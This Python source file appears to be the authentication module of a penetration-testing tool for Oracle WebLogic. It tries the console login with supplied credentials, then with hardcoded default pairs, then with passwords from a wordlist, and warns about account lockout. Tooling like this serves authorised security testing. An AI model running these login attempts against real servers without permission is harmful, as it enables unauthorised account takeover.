from src.platform.weblogic.interfaces import WINTERFACES
from requests.utils import dict_from_cookiejar
from sys import stdout
from log import LOG
import utility
import state


default_credentials = [('weblogic', 'weblogic'),
                       ('weblogic', 'weblogic1')
                      ]

def _auth(usr, pswd, ip, fingerprint):
    """ Authenticate to j_security_check and return the cookie
    """

    try:
        base = "http://{0}:{1}".format(ip, fingerprint.port)
        uri = "/console/j_security_check"

        data = { "j_username" : usr,
                 "j_password" : pswd,
                 "j_character_encoding" : "UTF-8"
               }

        if fingerprint.title is WINTERFACES.WLS:
            base = base.replace("http", "https")

        response = utility.requests_post(base + uri, data=data)
        if len(response.history) > 1:

                cookies = dict_from_cookiejar(response.history[0].cookies)
                if not cookies:
                    return False
                else:
                    utility.Msg("Successfully authenticated with %s:%s" % 
                                    (usr, pswd), LOG.DEBUG)
                    return (cookies, None)

    except Exception, e: 
        utility.Msg("Failed to authenticate: %s" % e)
     
    return False 


def checkAuth(ip, fingerprint, returnCookie = False):
    """ Default behavior is to simply return True/False based on
    whether or not authentication with the credentials was successful.
    If returnCookie is set to true, we return the required auth cookie.

    Returns a tuple of (usr, pswd) in the event of a success, otherwise
    (None, None) is returned.
    """

    # check with given auth
    if state.usr_auth:
        (usr, pswd) = state.usr_auth.split(':')
        auth = _auth(usr, pswd, ip, fingerprint)
        if auth:
            return auth

    # else try default credentials
    for (usr, pswd) in default_credentials:

        auth = _auth(usr, pswd, ip, fingerprint)
        if auth:
            return auth

    # if we're still here, lets check for a wordlist
    if state.bf_wordlist and not state.hasbf:
    
        #
        # by default, certain WebLogic servers have a lockout of 5 attempts 
        # before a 30 minute lock.  Lets confirm the user knows this.
        #
        tmp = utility.capture_input("WebLogic has a lockout after 5 attempts.  Continue? [Y/n]")
        if 'n' in tmp: return (None, None)

        state.hasbf = True
        wordlist = []

        try:
            with open(state.bf_wordlist, 'r') as f:
                wordlist = [x.decode('ascii', "ignore").rstrip() for x in f.readlines()]
        except Exception, e:
            utility.Msg(e, LOG.DEBUG)
            return (None, None)

        utility.Msg('Brute forcing %s account with %d passwords...' % 
                                    (state.bf_user, len(wordlist)), LOG.DEBUG)

        try:
            for (idx, word) in enumerate(wordlist):
                stdout.flush()
                stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m" \
                                % (utility.timestamp(), state.bf_user,
                                   idx+1, len(wordlist)))

                auth = _auth(state.bf_user, word, ip, fingerprint)
                if auth:
                    print ''

                    # insert creds into default cred list
                    if not (state.bf_user, word) in default_credentials:
                        default_credentials.insert(0, (state.bf_user, word))

                    utility.Msg("Successful login %s:%s" % 
                                    (state.bf_user, word), LOG.SUCCESS)
                    return auth

            print ''

        except KeyboardInterrupt:
            pass

    return (None, None)
